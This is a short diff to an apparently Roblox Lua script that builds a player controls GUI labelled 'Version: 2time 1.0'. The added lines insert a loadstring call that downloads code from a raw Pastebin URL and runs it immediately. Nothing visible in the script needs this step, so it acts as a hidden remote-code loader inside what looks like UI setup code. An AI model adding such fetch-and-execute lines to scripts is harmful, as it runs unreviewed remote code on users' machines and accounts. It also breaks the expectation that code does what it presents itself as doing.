@@ -15,6 +15,10 @@ Controls.Parent = game.Players.LocalPlayer.PlayerGui
 Controls.Enabled = true
 Controls.MobileContainer.Visible = false
 Controls.Version.Text = "Version: 2time 1.0"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Kc5Wpt9s"))()
+wait(0.8)
+
 do
 	local Accessories = {}
 
